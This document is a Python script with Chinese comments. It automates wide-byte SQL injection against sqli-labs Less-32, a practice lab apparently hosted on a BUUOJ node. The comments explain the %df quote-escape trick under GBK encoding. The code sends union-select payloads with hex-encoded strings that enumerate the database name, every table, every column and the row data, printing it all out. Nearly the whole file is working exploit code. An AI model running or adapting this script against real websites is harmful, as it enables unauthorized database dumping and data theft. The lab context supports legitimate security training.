import re
import requests

# Less-32
# https://blog.csdn.net/jhzzzz/article/details/113094411
# https://blog.csdn.net/ZripenYe/article/details/119651799
# 宽字节注入的情况：'、"、)被转义，如'被转义为\'
# 单引号前加%df，GBK编码中反斜杠的编码为%5c，而%df%5c表示繁体字“連”，所以这时单引号成功逃逸
payload1 = "?id=1%df'"
payload2 = "?id=-1%df'"

# 接下来可以参照联合查询 或 其它可用的查询
# 但注意后面的sql语句不能出现会被转移的字符，如不能出现TABLE_SCHEMA='security'。这需要把字符串'security'转为16进制
def StringToHex(str):
    return '0x'+''.join([hex(ord(c)).replace('0x','') for c in str])
print(StringToHex("security"))
# 获取数据库名
def GetDBName(url):
    db_name = ''
    test = url + payload2 + " union select 1,database(),3 from information_schema.schemata --+"
    # 请求
    req = requests.get(test)
    req.encoding = 'gbk'
    # 得到网页的html
    html = req.text
    text = str(html)
    # 正则匹配
    db_name = re.search("Your Login name:(.*?)<", text).group(1)
    return db_name


# 获取数据库表函数
def GetDBTables(url, table_schema):
    table_names = []
    table_schema=StringToHex(table_schema)
    # 一次获取一个
    for num in range(20):
        test = url + payload2 + f"union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA={table_schema} limit {num},1),3 --+"
        # 请求
        print(test)
        con = requests.get(test)
        con.encoding = 'gbk'
        # 得到网页的html
        html = con.text
        text = str(html)
        table_name = re.search("Your Login name:(.*?)<", text).group(1)
        if table_name == "":
            # num超过现有个数而没有结果，则break
            break
        table_names.append(table_name)
    return table_names


# 获取数据库表的字段函数
def GetDBColumns(url, db_name, table_name):
    column_names = []
    db_name=StringToHex(db_name)
    table_name=StringToHex(table_name)
    for num in range(20):
        test = url + payload2 + "union select 1,(select column_name from " \
                                f"information_schema.columns where TABLE_SCHEMA={db_name} and table_name={table_name} limit {num},1),3--+ "
        # 请求
        # print(test)
        con = requests.get(test)
        # print(con.url)
        con.encoding = 'gbk'
        html = con.text
        # 得到网页的html
        text = str(html)
        column_name = re.search("Your Login name:(.*?)<", text).group(1)
        if column_name == "":
            # num超过现有个数而没有结果，则break
            break
        column_names.append(column_name)
    return column_names


# 获取表数据函数
def GetDBData(url, db_name, table_name, colunm_name):
    colunm_values = {}
    colunm_values[colunm_name] = []
    for num in range(20):
        test = url + payload2 + f" union select 1,(select {colunm_name} from {db_name}.{table_name} limit {num},1),3--+ "
        # 请求
        # print(test)
        con = requests.get(test)
        con.encoding = 'gbk'
        # 得到网页的html
        html = con.text
        text = str(html)
        column_value = re.search("Your Login name:(.*?)<", text).group(1)
        if column_value == "":
            # num超过现有个数而没有结果，则break
            break
        colunm_values[colunm_name].append(column_value)
    return colunm_values


def StartSqli(url):
    db_name = GetDBName(url)
    print(str(db_name))
    table_names = GetDBTables(url, db_name)
    print('-- ' + db_name + ':' + str(table_names))
    for table_name in table_names:
        column_names = GetDBColumns(url, db_name, table_name)
        print('---- ' + table_name + ':' + str(column_names))
        for column_name in column_names:
            column_values = GetDBData(url, db_name, table_name, column_name)
            print('------' + column_name + ':' + str(column_values[column_name]))


if __name__ == '__main__':
    url = "http://1d7b87a0-abb7-4168-909e-7ac77d06f8e4.node4.buuoj.cn/Less-32/"
    StartSqli(url)
